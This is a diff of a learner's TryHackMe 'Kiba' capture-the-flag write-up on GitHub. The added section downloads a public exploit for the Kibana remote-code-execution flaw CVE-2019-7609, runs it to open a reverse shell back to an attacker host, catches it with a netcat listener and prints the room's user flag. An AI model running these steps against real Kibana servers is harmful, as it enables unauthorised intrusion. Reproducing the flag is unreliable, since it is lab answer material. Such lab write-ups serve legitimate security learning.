@@ -1,7 +1,7 @@
 <p align="center"><p align="center">April 7, 2025<br>
 Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m genuinely excited to join you on this adventure.<br>
-It´s part of my $$\textcolor{#FF69B4}{\textbf{336}}$$-day-streak in  <a href="https://tryhackme.com">TryHackMe</a>.<br><br>
-  <img width="160px" src="https://github.com/user-attachments/assets/2618b170-66fb-4cd0-8989-4baf6071e985"></p>
+It´s part of my $$\textcolor{#FF69B4}{\textbf{337}}$$-day-streak in  <a href="https://tryhackme.com">TryHackMe</a>.<br><br>
+  <img width="160px" src="https://github.com/user-attachments/assets/fd531592-487b-4cb5-8259-63887615d678"></p>
 
 <h1 align="center"> $$\textcolor{#3bd62d}{\textnormal{Kiba}}$$</h1>
 
@@ -24,17 +24,12 @@ It´s part of my $$\textcolor{#FF69B4}{\textbf{336}}$$-day-streak in  <a href="h
 <p align="center">There are have 3 ports open: <code>ssh/22</code>, <code>http/80</code> and <code>esmagent?/5601</code>. </p>
 
 ```bash
-oot@ip-10-10-189-214:~# nmap -sC -sV -sS -O -A -Pn -p- 10.10.16.119
-Starting Nmap 7.80 ( https://nmap.org ) at 2025-04-08 01:53 BST
-Nmap scan report for 10.10.16.119
-Host is up (0.00031s latency).
-Not shown: 65532 closed ports
+:~# nmap -sC -sV -sS -O -A -Pn -p- TargetIP
+...
 PORT     STATE SERVICE   VERSION
 22/tcp   open  ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
-|   2048 9d:f8:d1:57:13:24:81:b6:18:5d:04:8e:d2:38:4f:90 (RSA)
-|   256 e1:e6:7a:a1:a1:1c:be:03:d2:4e:27:1b:0d:0a:ec:b1 (ECDSA)
-|_  256 2a:ba:e5:c5:fb:51:38:17:45:e7:b1:54:ca:a1:a3:fc (ED25519)
+...
 80/tcp   open  http      Apache httpd 2.4.18 ((Ubuntu))
 |_http-server-header: Apache/2.4.18 (Ubuntu)
 |_http-title: Site doesn't have a title (text/html).
@@ -100,6 +95,52 @@ PORT     STATE SERVICE   VERSION
 https://nvd.nist.gov/vuln/detail/cve-2019-7609
 
 ![image](https://github.com/user-attachments/assets/0b3b8237-3715-4e9f-bf03-f73056bba5dd)
+
+<br>
+
+
+<h2 align="center">$$\textcolor{white}{\textnormal{Downloaded an exploit for CVE-2019-7609}}$$</h2>
+
+https://raw.githubusercontent.com/LandGrey/CVE-2019-7609/refs/heads/master/CVE-2019-7609-kibana-rce.py
+
+
+<br>
+
+<h2 align="center">$$\textcolor{white}{\textnormal{Ran the exploit in Attack vm after setting up a listener}}$$</h2>
+
+```bash
+:~/kiba# ls
+CVE-2019-7609-kibana-rce.py
+:~/kiba# python CVE-2019-7609-kibana-rce.py -u http://TargetIP:5601 -host AttackIP -port AttackPort --shell
+[+] http://10.10.25.155:5601 maybe exists CVE-2019-7609 (kibana < 6.6.1 RCE) vulnerability
+[+] reverse shell completely! please check session on: AttackIP:AttackPort
+:~/kiba# 
+```
+
+<br>
+
+<h2 align="center">$$\textcolor{white}{\textnorma{Got the shell}}$$</h2>
+
+```bash
+:~/kiba# nc -lnvp 4444
+...
+kiba@ubuntu:/home/kiba/kibana/bin$ id
+id
+uid=1000(kiba) gid=1000(kiba) groups=1000(kiba),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare)
+kiba@ubuntu:/home/kiba/kibana/bin$ cd ..
+cd ..
+kiba@ubuntu:/home/kiba/kibana$ cd ..
+cd ..
+kiba@ubuntu:/home/kiba$ ls
+ls
+elasticsearch-6.5.4.deb
+kibana
+user.txt
+kiba@ubuntu:/home/kiba$ cat user.txt
+cat user.txt
+THM{1s_easy_pwn3d_k1bana_w1th_rce}
+kiba@ubuntu:/home/kiba$ 
+```
 
 
 
